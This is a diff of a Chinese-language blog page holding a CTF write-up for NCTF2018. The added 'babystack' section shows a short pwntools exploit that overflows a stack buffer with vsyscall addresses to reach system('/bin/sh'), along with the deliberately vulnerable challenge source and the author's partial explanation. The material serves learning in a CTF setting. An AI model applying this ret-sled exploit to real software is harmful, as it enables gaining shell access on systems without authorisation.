@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="4eriri&#39;s blog">
 <meta property="og:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T11:12:50.344Z">
+<meta property="og:updated_time" content="2018-12-08T12:41:01.751Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NCTF2018">
 <meta name="twitter:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
@@ -236,7 +236,17 @@
 <p>操作顺序：aaawwdwaaawasssssssasddsdwwddddwwwwwaaawwdddsdwawddddwdssdsaa</p>
 <p>用W540替换：<br>444Wd0W444W4555555545d0d05d0Wd0d0d0d0W444Wd0d0d05d0W4Wd0d0d0d0Wd055d0544</p>
 <p>输入这个应该就可以得到flag了。</p>
-<p>######呜呜呜pwn还是好难啊</p>
+<p>#####呜呜呜pwn还是好难啊</p>
+<p>#babystack</p>
+<p>看了github上的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./babystack&apos;)</span><br><span class="line">p.sendline(p64(0xffffffffff600000)*5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>orz其实完全不懂为啥，问了大佬然而大佬没看题目，后来偶然在群里看见有人说是vsyscall啥的，百度了一波，结果找到了之前就看过的<a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">一篇有关pie的教程</a>。</p>
+<p>如果仔细看看的话，在第三部分就能发现对vsyscall的介绍啥的……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000</span><br></pre></td></tr></table></figure>
+<p>脚本中<code>0xffffffffff600000</code>就是调用<code>gettimeofday</code>函数吧。</p>
+<p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void vul()</span><br><span class="line">&#123;</span><br><span class="line">	char a[10];</span><br><span class="line">	int n = readn(a,256);</span><br><span class="line">	if(n%8 != 0) exit(0);</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">	vul();</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	func();</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>栈溢出一直覆盖到exit的返回地址之前，然后执行完vsyscall之后就会往下执行<code>system(&quot;/bin/sh&quot;)</code>了吧（想再调试看看是不是这样的，然而鶸校园网在github上下个源文件都下不下来，下次网络好的时候看一下吧。但如果不是这样的话鶸的我就理解不了了，如果跟我想的一样的话，用其他3个vsyscall也可以达成一样的效果）。</p>
 
       
     </div>
@@ -248,7 +258,7 @@
         <p><span>本文标题:</span><a href="/2018/11/26/NCTF2018/">NCTF2018</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2018-11-26, 17:07:04</p>
-        <p><span>最后更新:</span>2018-12-03, 19:12:50</p>
+        <p><span>最后更新:</span>2018-12-08, 20:41:01</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/11/26/NCTF2018/" title="NCTF2018">http://yoursite.com/2018/11/26/NCTF2018/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/26/NCTF2018/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
